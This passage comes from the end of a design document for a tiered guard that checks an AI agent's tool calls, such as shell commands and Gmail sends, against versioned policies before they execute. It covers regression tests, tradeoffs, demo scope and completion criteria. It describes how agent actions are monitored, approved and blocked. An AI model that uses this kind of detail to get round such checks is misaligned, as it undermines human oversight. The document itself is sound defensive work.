- block executes zero times,
- changed arguments invalidate a prior decision,
- one proposal creates one final terminal event.

### 21.7 API and UI tests

- SSE and current interception show the same real trace.
- Selected agents receive only their own records.
- Replay shows normalized action and all tier evidence.
- Memory search returns policy and decision versions.
- Operations metrics reconcile with stored decisions.

### 21.8 Scenario regression corpus

Each scenario records:

```text
user request
tool proposal
expected normalized action
expected intent constraints
expected tiers
expected matched rules
expected final decision
expected execution status
```

CI must fail if a blocked scenario becomes executable.

## 22. Benefits and Tradeoffs

### Benefits

- deterministic user control remains central,
- semantic and LLM methods add context without owning authority,
- tools become comparable through capabilities,
- policies are agent-specific but structurally standardized,
- decisions are reproducible and explainable,
- expensive analysis runs only when needed,
- each tier can improve independently,
- the architecture supports a credible demo before advanced models exist.

### Tradeoffs

- setup requires accurate tool metadata,
- policy authoring requires usable templates and validation,
- conservative unknown handling can increase approval load,
- Tier 2 needs labeled and correctly isolated history,
- Tier 3 adds cost, latency, and nondeterminism,
- approval continuation is a separate security-sensitive system,
- shell normalization can never safely support every shell behavior without sandboxing.

## 23. Demo Implementation Scope

For the next implementation cycle, commit to:

1. One real ADK event path.
2. One versioned demo policy.
3. One capability-based tool registry.
4. Shell and Gmail action normalization.
5. Narrow deterministic intent extraction.
6. Complete Tier 1 enforcement.
7. A limited Elastic-backed Tier 2 for intent/action and precedents.
8. Tier 3 only for ambiguous Gmail send and selected shell actions.
9. Audit evidence in Live Interception and Trace Replay.
10. A checked-in safety regression corpus.

Do not make Tier 3 or advanced behavioral scoring a blocker for a useful Tier 1 demo.

## 24. Open Design Decisions

Before implementation, decide:

- YAML, JSON, or both for policy authoring,
- internal typed evaluator versus CEL or JSONLogic,
- exact platform rules that customers cannot override,
- shell parser library and supported syntax boundary,
- whether `review` remains a runtime decision or only an offline status,
- Tier 2 model choice and evidence thresholds,
- LLM provider and structured-output contract,
- policy behavior when Elastic is unavailable,
- storage authority for pending approvals,
- data retention and redaction requirements.

## 25. Definition of Done

The redesigned guard is ready for the scoped demo when:

- every ADK call is normalized and evaluated before execution,
- the selected agent resolves to a real versioned policy,
- Tier 1 always runs,
- explicit policy constraints cannot be overridden,
- Tier 2 and Tier 3 execute only according to a recorded plan,
- failures apply documented fallbacks,
- decisions identify policy, rules, tiers, versions, and exact arguments,
- blocked and approval-required calls do not execute,
- allowed calls produce post-execution evidence,
- all results appear consistently in live, replay, memory, and operations views,
- the safety regression corpus passes.
